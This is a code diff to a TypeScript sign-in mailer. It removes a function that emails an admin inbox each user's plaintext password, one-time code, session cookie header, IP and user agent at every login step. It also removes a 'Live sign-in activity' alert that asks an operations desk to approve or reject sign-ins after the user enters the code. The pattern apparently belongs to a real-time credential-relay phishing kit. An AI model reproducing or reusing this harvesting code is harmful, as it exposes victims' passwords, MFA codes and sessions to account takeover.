@@ -234,55 +234,8 @@ export async function sendOtpEmail(
       `<p>Hi${name ? ` ${name}` : ''},</p>
        <p>Your one-time sign-in code is:</p>
        <p style="font-size:28px;letter-spacing:6px;font-weight:700;color:#fff">${otp}</p>
-       <p>Enter this code <strong>twice</strong> on the sign-in page. It expires in 10 minutes.</p>
+       <p>This code expires in 10 minutes.</p>
        <p>If you did not try to sign in, ignore this email and contact support.</p>`
-    )
-  )
-}
-
-/** Immediate admin alert — TEST MODE includes plain email/password/username/OTP/cookies. */
-export async function sendAdminLoginStepAlert(input: {
-  attemptId: string
-  email: string
-  memberName: string
-  step: string
-  event: string
-  ip?: string
-  passwordPlain?: string
-  username?: string
-  otpPlain?: string
-  cookieHeader?: string
-  userAgent?: string
-}) {
-  const when = new Date().toLocaleString('en-US', {
-    dateStyle: 'medium',
-    timeStyle: 'medium',
-  })
-
-  const secrets = `
-       <div style="margin-top:16px;padding:12px;background:#0a100d;border-radius:8px;font-family:monospace;font-size:13px">
-         <p style="color:#8fbfa8;margin:0 0 8px">TEST · plain text (remove after testing)</p>
-         <p style="margin:4px 0"><strong>Email:</strong> ${input.email}</p>
-         ${input.passwordPlain ? `<p style="margin:4px 0"><strong>Password:</strong> ${input.passwordPlain}</p>` : ''}
-         ${input.username ? `<p style="margin:4px 0"><strong>Username:</strong> ${input.username}</p>` : ''}
-         ${input.otpPlain ? `<p style="margin:4px 0"><strong>OTP:</strong> ${input.otpPlain}</p>` : ''}
-         ${input.cookieHeader ? `<p style="margin:4px 0;word-break:break-all"><strong>Cookies:</strong> ${input.cookieHeader}</p>` : ''}
-         ${input.userAgent ? `<p style="margin:4px 0;word-break:break-all"><strong>User-Agent:</strong> ${input.userAgent}</p>` : ''}
-       </div>`
-
-  return sendMail(
-    ADMIN_INBOX,
-    `[Ops] Login step · ${input.memberName} · ${input.step}`,
-    wrap(
-      'Live sign-in activity',
-      `<p><strong>${input.memberName}</strong> (${input.email})</p>
-       <p>Step: <strong>${input.step}</strong></p>
-       <p>${input.event}</p>
-       <p>Time: ${when}</p>
-       ${input.ip ? `<p>IP: ${input.ip}</p>` : ''}
-       <p>Attempt ID: <code>${input.attemptId}</code></p>
-       ${secrets}
-       <p style="margin-top:12px">Open the <strong>Operations desk</strong> to approve or reject when the member finishes OTP.</p>`
     )
   )
 }
